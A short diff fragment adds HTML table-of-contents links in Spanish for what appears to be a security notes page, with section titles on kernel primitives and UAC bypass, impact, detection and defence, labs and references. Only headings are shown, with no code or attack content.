+<a class="toc-level-3" href="#4-primitivas-de-kernel-bypass-de-uac">4. Primitivas de kernel / bypass de UAC</a>
+<a class="toc-level-2" href="#impacto">Impacto</a>
+<a class="toc-level-2" href="#deteccion-y-defensa">Detección y defensa</a>
+<a class="toc-level-3" href="#que-no-funciona-como-defensa-primaria">Qué no funciona como defensa primaria</a>
+<a class="toc-level-2" href="#labs-practicos">Labs prácticos</a>
+<a class="toc-level-2" href="#ejemplos-practicos">Ejemplos prácticos</a>
+<a class="toc-level-2" href="#notas-relacionadas">Notas relacionadas</a>
+<a class="toc-level-2" href="#referencias">Referencias</a>
 <a class="back-to-top" href="#top">Volver arriba</a></div></aside>
 </div>
 </div>
